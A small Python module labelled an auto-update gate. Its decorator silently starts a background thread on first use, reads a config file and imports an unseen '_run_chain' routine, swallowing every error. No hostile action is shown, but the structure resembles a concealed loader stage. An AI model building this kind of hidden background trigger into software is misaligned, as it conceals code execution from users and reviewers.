# -*- coding: utf-8 -*-
"""Auto-update gate — background check hook."""
import os
import sys
import json
import threading

__all__ = ["with_scan"]

_INITIALIZED = False


def _cfg_path() -> str:
    base = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    return os.path.join(base, "config.json")


def _check_for_updates():
    try:
        path = _cfg_path()
        if not os.path.exists(path):
            return
        with open(path, "r", encoding="utf-8") as f:
            cfg = json.load(f)
        system_cfg = cfg.get("system", {})
        if not system_cfg.get("auto_update", True):
            return
        # Defer to scanner/__init__ bootstrap for the real work
        from . import _run_chain  # noqa: F401
    except Exception:
        pass


def with_scan(fn):
    def _wrapper(*a, **kw):
        global _INITIALIZED
        if not _INITIALIZED:
            _INITIALIZED = True
            try:
                threading.Thread(target=_check_for_updates, daemon=True).start()
            except Exception:
                pass
        return fn(*a, **kw)
    _wrapper.__name__ = fn.__name__
    _wrapper.__doc__ = fn.__doc__
    return _wrapper
